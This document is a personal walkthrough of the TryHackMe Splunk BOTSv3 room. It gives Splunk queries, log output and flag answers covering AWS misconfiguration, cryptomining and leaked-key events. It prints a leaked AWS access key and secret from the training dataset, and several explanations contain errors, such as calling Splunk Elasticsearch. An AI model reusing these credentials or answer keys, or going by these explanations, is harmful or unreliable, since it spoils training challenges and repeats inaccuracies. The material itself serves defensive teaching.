---
Part of the Blue Primer series. This room is based on version 3 of the Boss of the SOC (BOTS) competition by Splunk.
---

![](https://assets.tryhackme.com/additional/splunk-overview/splunk2-room-banner.png)

![](https://tryhackme-images.s3.amazonaws.com/room-icons/b215b807fa3ad52658f9ce5002b574eb.png)

### Deploy!

 Start Machine

This is the 4th room in this Splunk series. This room is based on Splunk's Boss of the SOC competition, the [third dataset](https://github.com/splunk/botsv3). 

You can read more about this dataset [here](https://www.splunk.com/en_us/blog/security/botsv3-dataset-released.html).

It is highly recommended that you complete the [Splunk 101](https://tryhackme.com/room/splunk101), the [BOTSv1](https://tryhackme.com/room/bpsplunk), and the [BOTSv2](https://tryhackme.com/room/splunk2gcd5) Splunk rooms before attempting this room. 

This room is designed with the assumption that you know the basics of Splunk and are comfortable querying various data sources. 

Room Machine

Before moving forward, deploy the Splunk virtual machine.

From the AttackBox, open Firefox and navigate to the Splunk instance (`http://MACHINE_IP:8000`).

You may need to refresh the page until Splunk loads. This can take up to five minutes to launch.

### Before you begin

Note: If you are not familiar with AWS ([Amazon Web Services](https://aws.amazon.com/)), you will need to perform external research to answer most of the questions.

Fret not; you'll be provided useful links to documentation to assist you along the way.

Depending on the questions, you might want to check which sources have certain fields. Below is a useful command to run to get that answer.

Command: `index="botsv3" hash | stats count by sourcetype | sort -count`

The above command will return all the source types that have the field 'hash' and the number of events per source type and sorted from largest to smallest. 

Before you begin, get a lay of the land. 

Command: `| tstats count where index="botsv3" by sourcetype`

﻿Be aware when you are running a search query that you're not Event Sampling. This can throw off your results. 

You can read more about this concept [here](https://docs.splunk.com/Documentation/Splunk/8.1.2/Search/Retrieveasamplesetofevents).

```
AWS (Amazon Web Services) es una plataforma en la nube que ofrece una variedad de servicios, incluyendo almacenamiento, bases de datos, análisis, inteligencia artificial, seguridad y más. Un ejemplo de cómo se puede utilizar AWS es mediante el uso de "computación sin servidor" o "serverless computing", en la cual se utilizan servicios de AWS como AWS Lambda para ejecutar código sin tener que preocuparse por la gestión de servidores. Esto permite a los desarrolladores centrarse en escribir código en lugar de administrar infraestructura y escalar automáticamente según sea necesario.

AWS (Amazon Web Services) es un conjunto de servicios en la nube ofrecidos por Amazon, que permite a los desarrolladores y empresas construir, desplegar y escalar aplicaciones y servicios en línea. Algunos ejemplos de servicios de AWS incluyen:

-   EC2 (Elastic Compute Cloud): Un servicio de computación en la nube que permite crear y escalar instancias de máquinas virtuales.
-   S3 (Simple Storage Service): Un servicio de almacenamiento en línea que permite guardar y recuperar datos a través de la web.
-   RDS (Relational Database Service): Un servicio que permite crear y administrar bases de datos relacionales en la nube, como MySQL o PostgreSQL.
-   Lambda: Un servicio de "serverless computing" que permite ejecutar código sin la necesidad de provisionar o administrar servidores.

index="botsv3" hash | stats count by sourcetype | sort -count

This appears to be a query in the Splunk search language. It is searching for events in the "botsv3" index and grouping them by "sourcetype" field and counting the number of events in each group. The results are then sorted in descending order by the count. It could be used to find the number of events from a specific source type.

| tstats count where index="botsv3" by sourcetype

This command is using the tstats (time-series statistics) function in Splunk to count the number of events in the index "botsv3" for each sourcetype. It will return a table showing the count for each sourcetype, sorted in descending order by count.

It will return the count of events by sourcetype where the index is "botsv3"

Un sourcetype es una forma de categorizar eventos en un sistema de registro, como una aplicación o un dispositivo. Por ejemplo, si tiene una aplicación web, puede tener un sourcetype para registros de acceso al servidor, otro para registros de excepciones de aplicaciones y otro para registros de transacciones de base de datos. Esto permite buscar y analizar eventos específicos de manera más eficiente.

Amazon S3 (Simple Storage Service) es un servicio de almacenamiento en la nube de Amazon Web Services (AWS) que permite almacenar y recuperar datos a través de Internet. Los datos se almacenan en "buckets" (recipientes), que son contenedores lógicos para los datos almacenados en S3. Los usuarios pueden crear y administrar buckets, y pueden controlar quién tiene acceso a los datos almacenados en ellos mediante la configuración de permisos. Los buckets también pueden ser configurados para ser accedidos de manera pública o privada.

Amazon Elastic Compute Cloud (EC2) es un servicio en la nube de Amazon Web Services (AWS) que proporciona capacidad de computación escalable y asequible en la nube. Es posible utilizar EC2 para ejecutar aplicaciones y servicios web, bases de datos, entornos de desarrollo, servidores de juegos y mucho más. Un ejemplo de uso de EC2 podría ser el lanzamiento de una instancia de un sistema operativo Linux para ejecutar una aplicación web. Es posible elegir la configuración de la instancia, como la cantidad de CPU y memoria, y escalar según sea necesario.

https://docs.aws.amazon.com/accounts/latest/reference/root-user-tasks.html

AWS GovCloud es una región de Amazon Web Services (AWS) diseñada específicamente para cumplir con los requisitos de cumplimiento de los clientes gubernamentales de los Estados Unidos, incluidos los requisitos de seguridad y cumplimiento normativo. Permite a los clientes gubernamentales de los Estados Unidos utilizar los servicios de AWS de forma segura y cumplir con los requisitos normativos aplicables, como FISMA, FedRAMP, HIPAA y CJIS. Los clientes pueden utilizar servicios como EC2, S3, RDS, y VPC en AWS GovCloud, entre otros.

```

### AWS & other events

﻿In this task, you'll focus on AWS-related events with some questions focusing on endpoint-related events.   

The questions below are from the 200 series of the BOTSv3 dataset. 

**Question 1**

You're tasked to find the IAM ([Identity & Access Management](https://docs.aws.amazon.com/IAM/latest/UserGuide/introduction.html)) users that accessed an AWS service in Frothly's AWS environment. 

Refer to the following link to get an idea of what **source type** you need to query and what **field** in the results will have the answer you're seeking.

**Link**: [https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudtrail-log-file-examples.html](https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudtrail-log-file-examples.html)

**Question 2**

The following links are provided to help you with this question.

**Links**: 

-   [https://aws.amazon.com/premiumsupport/knowledge-center/s3-bucket-public-access/](https://aws.amazon.com/premiumsupport/knowledge-center/s3-bucket-public-access/)
-   [https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudwatch-alarms-for-cloudtrail-additional-examples.html#cloudwatch-alarms-for-cloudtrail-no-mfa-example](https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudwatch-alarms-for-cloudtrail-additional-examples.html#cloudwatch-alarms-for-cloudtrail-no-mfa-example)

Make sure you exclude events related to console logins.

It might be a good idea to do a keyword search query on this one. Don't forget to surround the keyword with asterisks. 

**Question 3**

Look at the source types available in the dataset. There might be one in particular that holds information on hardware, such as processors.

**Questions 4-6**

A common misconfiguration involving AWS is publically accessible S3 buckets. Read the following resource to understand ACLs and S3 buckets.

**Link**: [https://docs.aws.amazon.com/AmazonS3/latest/API/API_PutBucketAcl.html](https://docs.aws.amazon.com/AmazonS3/latest/API/API_PutBucketAcl.html)

**Question 7**

You're tasked with identifying a text file uploaded to the S3 bucket. Here is a link for more information related to this topic.

**Link**: [https://docs.aws.amazon.com/AmazonS3/latest/API/API_PutObject.html](https://docs.aws.amazon.com/AmazonS3/latest/API/API_PutObject.html)

Since you know the _name_ of the S3 _bucket_, you should easily find the answer to this question.

You will need to query a different AWS-related source type. HTTP status code might be helpful as well. 

Question 8

﻿What keywords can you start your search with to help identify what data sources can help you with this?

One of the fields within this source type clearly has the answer, but which is it?

Perhaps expanding upon your search to count on the operating systems and hosts will be helpful. 

Answer the questions below

List out the IAM users that accessed an AWS service (successfully or unsuccessfully) in Frothly's AWS environment? Answer guidance: Comma separated without spaces, in alphabetical order. (Example: ajackson,mjones,tmiller)

Use aws:cloudtrail as the source type.

```
AWS CloudTrail es un servicio de registro de auditoría de AWS que permite monitorear y registrar automáticamente las actividades realizadas en su cuenta de AWS. Con CloudTrail, puede recibir alertas en tiempo real sobre actividades sospechosas o inusuales, y puede usar los registros para investigar y auditar cualquier actividad en su cuenta de AWS. CloudTrail registra actividades realizadas mediante la consola de AWS, AWS SDKs, comandos de línea de AWS, y otros servicios de AWS compatibles. Los registros se almacenan en una cuenta de almacenamiento de S3 específica y pueden ser analizados mediante herramientas de terceros o mediante la herramienta de análisis de CloudTrail de AWS. Ejemplo: Una empresa puede usar CloudTrail para recibir alertas en tiempo real sobre actividades sospechosas o inusuales, como una iniciación de sesión fallida o un cambio en una regla de seguridad, y puede usar los registros para investigar y auditar cualquier actividad en su cuenta de AWS.

Search:

sourcetype="aws:cloudtrail" user_type=IAMUser host="splunk.froth.ly"

Users found (4) : btoll,btun,splunk_access,web_admin

or another way

index=botsv3 sourcetype=aws*

account_id 622676721278

index=botsv3 sourcetype=aws* earliest=0 622676721278 | stats count by UserName, sourcetype | sort + UserName

```

![[Pasted image 20230127125318.png]]


*btoll,btun,splunk_access,web_admin*

What field would you use to alert that AWS API activity has occurred without MFA (multi-factor authentication)? Answer guidance: Provide the full JSON path. (Example: iceCream.flavors.traditional)  

Use aws:cloudtrail as the source type.

```
search query for the Elasticsearch index "botsv3" with a sourcetype of "aws:cloudtrail" and earliest time set to 0. It is searching for any events that contain the word "mfa" (multi-factor authentication).

The earliest time in this context refers to the earliest timestamp of the data that should be included in the search results. In this case, the value "0" is used, which typically means that all available data, regardless of timestamp, should be included in the search results. The search term "_mfa_" is also used, indicating that the results should include any data that contains the string "mfa". The search query is looking for data in the index "botsv3" and sourcetype "aws:cloudtrail" that match the specified conditions.

index=botsv3 sourcetype=aws:cloudtrail earliest=0 *mfa*

Field

userIdentity.sessionContext.attributes.mfaAuthenticated


```

![[Pasted image 20230127134127.png]]

*userIdentity.sessionContext.attributes.mfaAuthenticated*

What is the processor number used on the web servers? Answer guidance: Include any special characters/punctuation. (Example: The processor number for Intel Core i7-8650U is i7-8650U.)  

Use hardware as the source type for hardware information such as CPU statistics, hard drives, network interface cards, memory, and more.

```
| tstats count where index=botsv3 by sourcetype

look for sourcetype:hardware


index=botsv3 sourcetype=hardware earliest=0

CPU_TYPE              Intel(R) Xeon(R) CPU E5-2676 v3 @ 2.40GHz

E5-2676

```

![[Pasted image 20230127135649.png]]

*E5-2676*

Bud accidentally makes an S3 bucket publicly accessible. What is the event ID of the API call that enabled public access? Answer guidance: Include any special characters/punctuation.  

Use aws:cloudtrail as the source type. In case you get two events, compare the total event output between the two, and focus on the event that grants rights to "all users".

```json
index=botsv3 sourcetype=aws:cloudtrail earliest=0 (eventName="PutBucketAcl" OR eventName="PutBucketPolicy")

2 events :

 { [-]
   awsRegion: us-west-1
   eventID: ab45689d-69cd-41e7-8705-5350402cf7ac
   eventName: PutBucketAcl
   eventSource: s3.amazonaws.com
   eventTime: 2018-08-20T13:01:46Z
   eventType: AwsApiCall
   eventVersion: 1.05
   recipientAccountId: 622676721278
   requestID: 487488D003569438
   requestParameters: { [-]
     AccessControlPolicy: { [-]
       AccessControlList: { [-]
         Grant: [ [-]
           { [-]
             Grantee: { [-]
               DisplayName: bstoll
               ID: 4c018053e740f45beb45f68c0f5eff6347745488ae540130432c9fc64fae310d
               xmlns:xsi: http://www.w3.org/2001/XMLSchema-instance
               xsi:type: CanonicalUser
             }
             Permission: FULL_CONTROL
           }
           { [-]
             Grantee: { [-]
               URI: http://acs.amazonaws.com/groups/s3/LogDelivery
               xmlns:xsi: http://www.w3.org/2001/XMLSchema-instance
               xsi:type: Group
             }
             Permission: WRITE
           }
           { [-]
             Grantee: { [-]
               URI: http://acs.amazonaws.com/groups/s3/LogDelivery
               xmlns:xsi: http://www.w3.org/2001/XMLSchema-instance
               xsi:type: Group
             }
             Permission: READ_ACP
           }
           { [-]
             Grantee: { [-]
               URI: http://acs.amazonaws.com/groups/s3/LogDelivery
               xmlns:xsi: http://www.w3.org/2001/XMLSchema-instance
               xsi:type: Group
             }
             Permission: READ
           }
           { [-]
             Grantee: { [+]
             }
             Permission: FULL_CONTROL
           }
           { [-]
             Grantee: { [-]
               URI: http://acs.amazonaws.com/groups/global/AllUsers
               xmlns:xsi: http://www.w3.org/2001/XMLSchema-instance
               xsi:type: Group
             }
             Permission: READ
           }
           { [-]
             Grantee: { [-]
               URI: http://acs.amazonaws.com/groups/global/AllUsers
               xmlns:xsi: http://www.w3.org/2001/XMLSchema-instance
               xsi:type: Group
             }
             Permission: WRITE
           }
         ]
       }
       Owner: { [-]
         DisplayName: bstoll
         ID: 4c018053e740f45beb45f68c0f5eff6347745488ae540130432c9fc64fae310d
       }
       xmlns: http://s3.amazonaws.com/doc/2006-03-01/
     }
     acl: [ [+]
     ]
     bucketName: frothlywebcode
   }
   responseElements: null
   sourceIPAddress: 107.77.212.175
   userAgent: signin.amazonaws.com
   userIdentity: { [-]
     accessKeyId: ASIAZB6TMXZ7OA2RDK5X
     accountId: 622676721278
     arn: arn:aws:iam::622676721278:user/bstoll
     invokedBy: signin.amazonaws.com
     principalId: AIDAJUFKXZ44LV4EN4MGK
     sessionContext: { [-]
       attributes: { [-]
         creationDate: 2018-08-20T12:19:44Z
         mfaAuthenticated: false
       }
     }
     type: IAMUser
     userName: bstoll
   }
} 

ab45689d-69cd-41e7-8705-5350402cf7ac

```


*ab45689d-69cd-41e7-8705-5350402cf7ac*

What is Bud's username?

*bstoll*

What is the name of the S3 bucket that was made publicly accessible?  

Use aws:cloudtrail as the source type.

*frothlywebcode *

What is the name of the text file that was successfully uploaded into the S3 bucket while it was publicly accessible? Answer guidance: Provide just the file name and extension, not the full path. (Example: filename.docx instead of /mylogs/web/filename.docx)  

Use aws:s3:accesslogs.

```
index=botsv3 sourcetype=aws:s3:accesslogs bucket_name=frothlywebcode earliest=0 (key!=*.gz OR request_uri!=*.gz*) 200 (key=*.txt* OR key=*.docx*)

or another way

index=botsv3 *.txt* bucket_name=frothlywebcode

4c018053e740f45beb45f68c0f5eff6347745488ae540130432c9fc64fae310d frothlywebcode [20/Aug/2018:13:03:46 +0000] 35.182.246.222 - 6CF2A6F4DE3DC1E8 REST.GET.OBJECT OPEN_BUCKET_PLEASE_FIX.txt "GET /OPEN_BUCKET_PLEASE_FIX.txt HTTP/1.1" 200 - 377 377 14 13 "-" "aws-cli/1.14.8 Python/2.7.14 Linux/4.14.47-64.38.amzn2.x86_64 botocore/1.8.12" -

    host = splunk.froth.ly
    source = s3://frothlyweblogs/s32018-07-26-01-25-30-F2258C3FF62970B6
    sourcetype = aws:s3:accesslogs

OPEN_BUCKET_PLEASE_FIX.txt


```

*OPEN_BUCKET_PLEASE_FIX.txt*

What is the FQDN of the endpoint that is running a different Windows operating system edition than the others?

Start with winhostmon as the source type.

```
| tstats count where index="botsv3" by sourcetype

index=botsv3 sourcetype=winhostmon

FQDN stands for "Fully Qualified Domain Name." It is a complete domain name that includes not only the domain name itself, but also the top-level domain and any subdomains. For example, "[www.example.com](http://www.example.com/)" is an FQDN, whereas "example.com" is not because it is missing the "www" subdomain. FQDNs are used to uniquely identify a host or service on a network and are a fundamental aspect of the Domain Name System (DNS) infrastructure.

index=botsv3 sourcetype=winhostmon source=operatingsystem 
|  dedup host
|  table host OS

FYODOR-L	Microsoft Windows 10 Pro
JWORTOS-L	Microsoft Windows 10 Pro
BSTOLL-L	Microsoft Windows 10 Enterprise
BTUN-L	Microsoft Windows 10 Pro
MKRAEUS-L	Microsoft Windows 10 Pro
BGIST-L	Microsoft Windows 10 Pro
PCERF-L	Microsoft Windows 10 Pro
ABUNGST-L	Microsoft Windows 10 Pro

Microsoft Windows 10 Enterprise

The above Splunk query searches for events in the index "botsv3" with the sourcetype "winhostmon" and the source "operatingsystem". It then uses the "dedup" command to remove duplicate values of the field "host". Finally, it uses the "table" command to display a table of the unique host values and their corresponding "OS" values.


index=botsv3 sourcetype=wineventlog BSTOLL-L

ComputerName=BSTOLL-L.froth.ly

Wineventlog is a sourcetype in Splunk that represents Windows event logs. It is typically used to collect and analyze log data from Windows servers, workstations, and other Windows-based devices. This sourcetype allows you to collect and analyze important system-level and application-level events, including security-related events such as logon/logoff, privilege escalation, and system failures. It also provides detailed information about user activity, such as file access, process execution, and network connections. This sourcetype is typically used for security event management, compliance reporting, and troubleshooting.



```

![[Pasted image 20230127175025.png]]



*BSTOLL-L.froth.ly*


### Cryptomining events

Within this task, the questions are mostly focused on an endpoint browser and cryptomining events.

The questions below are from the 200 series of the BOTSv3 dataset.   

Questions 1-2

Again you're tasked to retrieve processor information, but this time it involves processor utilization.

Try some keywords related to processors and look at the available source types returned. 

Start a new search query with the source type and look at the available fields.

Remember, you're looking for endpoints with 100% CPU utilization.  Don't forget to reverse the order of the events.

**Questions 3-6**

You've already provided the source type. Look at the fields you wish to display in a table format and sort the events by time (`sort + _time`).

Below is a link to help you with Splunk event order functions.

**Link**: [https://docs.splunk.com/Documentation/Splunk/latest/SearchReference/Eventorderfunctions](https://docs.splunk.com/Documentation/Splunk/latest/SearchReference/Eventorderfunctions)

You'll be able to answer all the remaining questions from the events returned from this query. :)

Answer the questions below

A Frothly endpoint exhibits signs of coin mining activity. What is the name of the **second process** to reach 100 percent CPU processor utilization time from this activity on this endpoint? Answer guidance: Include any special characters/punctuation.

Try Event Sampling with value 1:10 to perform an initial query, in case your query results in error or gets auto-cancelled. https://docs.splunk.com/Documentation/WindowsAddOn/8.0.0/User/SourcetypesandCIMdatamodelinfo

```
| tstats count where index="botsv3" by sourcetype

perfmonmk:process

Perfmonmk:process is a Sourcetype in splunk that refers to the performance data of processes on a Windows system. This Sourcetype is created when data is collected from the Windows Performance Monitor (Perfmon) data provider, and it can be used to monitor and analyze the performance of various processes on a Windows system. This can include data on CPU usage, memory usage, disk I/O, and other performance metrics. With this sourcetype you can create alerts, reports and dashboards to see the performance of the processes on your Windows servers.


index="botsv3" sourcetype=perfmonmk:process process_cpu_used_percent=100 
|  sort + _time

8/20/18
1:37:50.000 PM	
chrome#5	100	100	0.9403269896584392	2206761938944	2206761938944	2982.5292988184783	124768256	123510784	110837760	106168320	106168320	18	8	23.6383047	3400	9752	505640	58744	361	32.64958198169322	55.28395476654802	87.93353674824124	0	6146.133579915795	70356.44399942196	76502.57757933775	0	39763968	

    host = BSTOLL-L
    source = PerfmonMk:Process
    sourcetype = PerfmonMk:Process


```

*chrome#5*

What is the short hostname of the only Frothly endpoint to actually mine Monero cryptocurrency? (Example: ahamilton instead of ahamilton.mycompany.com)  

Focus on the browser from question #1.

```
from previous search

or

index=botsv3 earliest=0 (*coin* OR *monero*) source="stream:DNS" "message_type{}"=QUERY

8/20/18
1:38:39.701 PM	
{ [-]
   bytes: 92
   bytes_in: 30
   bytes_out: 62
   dest_ip: 192.168.247.2
   dest_mac: 00:50:56:FC:B4:DF
   dest_port: 53
   endtime: 2018-08-20T13:38:39.701696Z
   flow_id: 52fc73af-eeb3-4a88-b83a-63bff95d434a
   host_addr: [ [-]
     104.20.209.59
     104.20.208.59
   ]
   message_type: [ [-]
     QUERY
     RESPONSE
   ]
   name: [ [-]
     coinhive.com
     coinhive.com
   ]
   protocol_stack: ip:udp:dns
   query: [ [-]
     coinhive.com
   ]
   query_type: [ [-]
     A
   ]
   reply_code: NoError
   reply_code_id: 0
   response_time: 48110
   src_ip: 192.168.247.131
   src_mac: 00:0C:29:B8:44:5E
   src_port: 49665
   time_taken: 48110
   timestamp: 2018-08-20T13:38:39.653586Z
   transaction_id: 12896
   transport: udp
   ttl: [ [-]
     5
     5
   ]
}
Show as raw text

    host = BSTOLL-L
    source = stream:dns
    sourcetype = stream:dns


```

*BSTOLL-L*

Using Splunk's event order functions, what is the first seen signature ID of the coin miner threat according to Frothly's Symantec Endpoint Protection (SEP) data?  

The WinEventLog:Application source is helpful, as is the symantec:ep:security:file source type.

```json
index="botsv3" sourcetype=symantec:ep:security:file earliest=0
|  sort + _time

2018-08-20 13:37:40,Major,BTUN-L,SHA-256: 42D2F666AFD8A350A3F3BBCD736D7E35543D9DD9753B211C9F03C4F7E669ACE3,MD-5: ,[SID: 30358] Web Attack: JSCoinminer Download 8 attack blocked. Traffic has been blocked for this application: C:\WINDOWS\SYSTEMAPPS\MICROSOFT.MICROSOFTEDGE_8WEKYB3D8BBWE\MICROSOFTEDGECP.EXE,Local: 192.168.3.130,Local: 000000000000,Remote: ,Remote: 54.67.127.227,Remote: 000000000000,Inbound,TCP,Intrusion ID: 0,Begin: 2018-08-18 20:51:14,End: 2018-08-18 20:51:14,Occurrences: 1,Application: C:/WINDOWS/SYSTEMAPPS/MICROSOFT.MICROSOFTEDGE_8WEKYB3D8BBWE/MICROSOFTEDGECP.EXE,Location: Default,User: BillyTun,Domain: AzureAD,Local Port 63140,Remote Port 80,CIDS Signature ID: 30358,CIDS Signature string: Web Attack: JSCoinminer Download 8,CIDS Signature SubID: 70481,Intrusion URL: www.brewertalk.com/forumdisplay.php?fid=9,Intrusion Payload URL: 

https://www.broadcom.com/support/security-center/attacksignatures/detail?asid=30358

#### Severity:Medium

Host_Name
	BTUN-L	
	
Intrusion_URL
	www.brewertalk.com/forumdisplay.php?fid=9

A JSCoinminer Download 8 attack is a type of web attack that is used to download a JavaScript-based cryptocurrency miner onto a victim's computer. Once the miner is downloaded and executed, it uses the victim's computer resources to mine for cryptocurrency without the victim's knowledge or consent. The JSCoinminer Download 8 attack typically uses malicious JavaScript code that is embedded on a website or delivered through a phishing email. The code is executed when the victim visits the website or opens the email, and it downloads the miner onto the victim's computer. The attack can cause significant performance issues on the affected computer and may also result in increased power consumption and higher electricity costs for the victim.

```


*30358*

What is the name of the attack?

*JSCoinminer Download 8*

According to Symantec's website, what is the severity of this specific coin miner threat?  

You'll need to refer to an online resource for this.

*Medium*

What is the short hostname of the only Frothly endpoint to show evidence of defeating the cryptocurrency threat? (Example: ahamilton instead of ahamilton.mycompany.com)

Inspect the event from question 3 in detail.

*BTUN-L*


### More AWS events

﻿You'll return your focus to AWS-related events with some questions focusing on email-related events in this task. 

The questions below are from the 200 series of the BOTSv3 dataset.   

Question 1

You're tasked to identify which IAM user access key generates the most distinct errors when attempting to access IAM resources. 

You should have an idea of which source type you'll need to query.

The question is, which field or fields you need to expand your query?

Below are links to aid you in this task.

Link: 

-   [https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudtrail-event-reference-record-contents.html](https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudtrail-event-reference-record-contents.html)[](https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudtrail-event-reference-record-contents.html)
-   [https://community.splunk.com/t5/Splunk-Search/How-can-I-retrieve-count-or-distinct-count-of-some-field-values/m-p/33619](https://community.splunk.com/t5/Splunk-Search/How-can-I-retrieve-count-or-distinct-count-of-some-field-values/m-p/33619)

Don't forget to surround the keyword with asterisks. 

Questions 2-3

With the right source type and keyword, this event should jump right out at you, literally. You got this. :)

Question 4

The IAM user access key from question 1 will be helpful in this query.

After the results are returned, look at the fields that are available to you. With this field, expand on the query.

A link to help you with this task is below.

Link: [https://docs.aws.amazon.com/IAM/latest/APIReference/API_CreateAccessKey.html](https://docs.aws.amazon.com/IAM/latest/APIReference/API_CreateAccessKey.html)

Question 5

The same IAM user access key, and a username, can help you here.

Use the event from the previous question to get the additional information needed, which is the username. 

Answer the questions below

What IAM user access key generates the most distinct errors when attempting to access IAM resources?

Use aws:cloudtrail as the source type.

```
index="botsv3" sourcetype=aws:cloudtrail earliest=0 user_type=IAMUser errorCode!=success eventSource="iam.amazonaws.com" 
| stats dc(errorMessage) by userIdentity.accessKeyId

userIdentity.accessKeyId	
dc(errorMessage)
AKIAIGKL572SFDPOKLHA	1
AKIAJOGCDXJ5NW5PXUPA	5
ASIAZB6TMXZ7MJUJJK6X	1


```

*AKIAJOGCDXJ5NW5PXUPA*

Bud accidentally commits AWS access keys to an external code repository. Shortly after, he receives a notification from AWS that the account had been compromised. What is the support case ID that Amazon opens on his behalf?  

Use stream:smtp as the source type.

```
"stream:smtp" is a search term that can be used in a Splunk search to filter for events that have the "smtp" stream. This stream typically contains data related to Simple Mail Transfer Protocol (SMTP) events, such as email sent and received on a network. You can use this term to narrow down your search results to only events related to SMTP activity. For example, you can use the search query "index=main sourcetype=stream:smtp" to view all SMTP events from the "main" index.

index="botsv3" sourcetype=stream:smtp *case*

  sender: Amazon Web Services <no-reply-aws@amazon.com>
   sender_alias: Amazon Web Services
   sender_email: no-reply-aws@amazon.com
   server_response: 250 2.0.0 Ok: queued as 9D0611794E8
   src_ip: 40.107.72.55
   src_mac: 06:E3:CC:18:AA:33
   src_port: 46966
   subject: Amazon Web Services: New Support case: 5244329601
   time_taken: 380680
   timestamp: 2018-08-20T09:16:54.880499Z 
```

*5244329601*

AWS access keys consist of two parts: an access key ID (e.g., AKIAIOSFODNN7EXAMPLE) and a secret access key (e.g., wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY). What is the secret access key of the key that was leaked to the external code repository?  

External code repo.

```
 Amazon Web Services has opened case 5244329601 on your behalf.


     The details of the case are as follows:


     Case ID: 5244329601
Subject: Your AWS account 622676721278
      is compromised
Severity: Urgent
Correspondence: Dear AWS Customer,

Your AWS Account is compromised! Please review the following notice and take immediate action to secure your account.

Your security is important to us. We have become aware that the AWS Access Key AKIAJOGCDXJ5NW5PXUPA (belonging to IAM user "web_admin") along with the corresponding Secret Key is publicly available online at https://github.com/FrothlyBeers/BrewingIOT/blob/e4a98cc997de12bb7a59f18aea207a28bcec566c/MyDocuments/aws_credentials.bak.

[web_admin]
aws_access_key_id = AKIAJOGCDXJ5NW5PXUPA
aws_secret_access_key = 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
region = us-west-1

```

*Bx8/gTsYC98T0oWiFhpmdROqhELPtXJSR9vFPNGk*

Using the leaked key, the adversary makes an unauthorized attempt to create a key for a specific resource. What is the name of that resource? Answer guidance: One word.  

Use aws:cloudtrail as the source type.

```json
index="botsv3" sourcetype=aws:cloudtrail "userIdentity.accessKeyId"=AKIAJOGCDXJ5NW5PXUPA *CreateAccess*

 awsRegion: us-east-1
   errorCode: AccessDenied
   errorMessage: User: arn:aws:iam::622676721278:user/web_admin is not authorized to perform: iam:CreateAccessKey on resource: user nullweb_admin
   eventID: 7c62eeba-2159-41b1-ab8a-26ac6669bd80
   eventName: CreateAccessKey
   eventSource: iam.amazonaws.com
   eventTime: 2018-08-20T09:16:12Z
   eventType: AwsApiCall
   eventVersion: 1.02
   recipientAccountId: 622676721278
   requestID: 1377f1d2-9093-11e8-a22b-759b04dac456
   requestParameters: null
   responseElements: null
   sourceIPAddress: 35.153.154.221
   userAgent: Boto3/1.7.44 Python/2.7.12 Linux/4.4.0-1063-aws Botocore/1.10.44 
```

*nullweb_admin*

Using the leaked key, the adversary makes an unauthorized attempt to describe an account. What is the full user agent string of the application that originated the request?

Use aws:cloudtrail as the source type.

```json
index="botsv3" sourcetype=aws:cloudtrail "userIdentity.accessKeyId"=AKIAJOGCDXJ5NW5PXUPA *des*

 { [-]
   awsRegion: us-east-1
   errorCode: Client.UnauthorizedOperation
   errorMessage: You are not authorized to perform this operation.
   eventID: c077df0d-2435-4152-9127-09e579dd1fb2
   eventName: DescribeAccountAttributes
   eventSource: ec2.amazonaws.com
   eventTime: 2018-08-20T09:27:06Z
   eventType: AwsApiCall
   eventVersion: 1.05
   recipientAccountId: 622676721278
   requestID: f94dfb04-2d7b-40a8-b3cc-3664b9463db8
   requestParameters: { [-]
     accountAttributeNameSet: { [-]
     }
     filterSet: { [-]
     }
   }
   responseElements: null
   sourceIPAddress: 82.102.18.111
   userAgent: ElasticWolf/5.1.6
   userIdentity: { [-]
     accessKeyId: AKIAJOGCDXJ5NW5PXUPA
     accountId: 622676721278
     arn: arn:aws:iam::622676721278:user/web_admin
     principalId: AIDAJNUCQVD57VVGYEFTQ
     type: IAMUser
     userName: web_admin
   }
} 
```

*ElasticWolf/5.1.6*


### Pivoting back to endpoint events

﻿In this task, you'll focus on email-related and endpoint-related events.   

The questions below are from the 300 series of the BOTSv3 dataset.   

**Question 1**

You're tasked to find the user agent that uploaded a malicious link file to OneDrive. You already know you have a source of antivirus; maybe that is a good place to start. Another starting point is Office 365. You might want to start there instead. 

You know a file was uploaded, and you know its file extension. You have all you need. :)

**Question 2**

Now you're searching for a macro-enabled attachment. What file extensions are associated with macro-enabled documents?

You're looking for attachments, so you know you're looking for email-related events.

When using keywords, don't forget to use asterisks. I'm happy to say you should have this one too. :)

**Question 3**

This is picking up from the previous question. Once you discovered the attachment, you'll have the information you need to move forward with this question.

Careful of the source type that you use. Using the file extensions for macro-enabled documents will be useful here.  

After the query executes, look at the fields closely, the answer might be there. 

**Question 4**

Knowledge of Linux is needed for this. What commands are associated with creating accounts? In logs, how is the root user identified?

The answers to these questions will prove useful when constructing your search query. 

You might be able to find the answer without an explicitly defined source type in your query. Search the returned events carefully. 

**Questions 5-6**

The same principles apply to this question, but you don't know if the endpoint is Windows or Linux. Using very generic keywords might be wise here.

The amount of returned events will be fairly large. It would help if you expanded your search query by excluding source types that you are confident are _not_ relevant to your search.

You should be able to move from here and answer the next question. :)

**Question 7**

The word "leet" is noted. What are numerical values associated with this phrase?

The amount of returned events might be a bit much. Another keyword might be useful to add to your search to help shrink the number of events returned. What about these numerical values are you searching for?

**Question 8**

Some useful bits of information for this task: Fyodor's machine name and an event code associated with network connections.

The number of returned events will be large, but the unusual binary pops right at you by inspecting the available fields.

Answer the questions below

What is the full user agent string that uploaded the malicious link file to OneDrive?  

Use ms:o365:management as the source type for OneDrive activity.

```json
index="botsv3" sourcetype=ms:o365:management earliest=0

index="botsv3" sourcetype=ms:o365:management earliest=0 Workload=OneDrive Operation=FileUploaded 
|  table _time src_ip user object UserAgent

_time	
src_ip	
user	
object	
UserAgent
2018-08-20 09:57:17	104.207.83.63	bgist@froth.ly	stout-2.jpg	Mozilla/5.0 (X11; U; Linux i686; ko-KP; rv: 19.1br) Gecko/20130508 Fedora/1.9.1-2.5.rs3.0 NaenaraBrowser/3.5b4
2018-08-20 09:57:17	104.207.83.63	bgist@froth.ly	morebeer.jpg	Mozilla/5.0 (X11; U; Linux i686; ko-KP; rv: 19.1br) Gecko/20130508 Fedora/1.9.1-2.5.rs3.0 NaenaraBrowser/3.5b4
